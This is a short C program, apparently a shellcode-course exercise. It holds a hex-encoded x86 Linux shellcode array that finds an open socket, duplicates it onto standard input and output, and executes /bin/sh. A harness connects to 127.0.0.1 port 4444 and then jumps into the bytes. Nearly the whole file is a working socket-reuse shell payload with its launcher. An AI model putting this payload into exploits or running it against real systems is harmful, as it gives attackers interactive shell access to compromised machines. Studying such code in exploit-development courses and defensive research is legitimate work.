#include <sys/socket.h>
#include <netinet/ip.h>

unsigned char code[] = \
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x66\x6a\x48\x68"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

void main(int argc, char *argv[])
{

    // START block of code of code taken from assignment n.2

    int client_socket_fd;
    char *empty[] = { 0 };
    struct sockaddr_in client_address;

    client_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    client_address.sin_family = AF_INET;
    inet_aton("127.0.0.1", &client_address.sin_addr);
    client_address.sin_port = htons(4444);
    connect(client_socket_fd, (struct sockaddr *)&client_address, sizeof(client_address));

    // END block of code of code taken from assignment n.2

    int (*ret)() = (int(*)())code;
    ret();
}
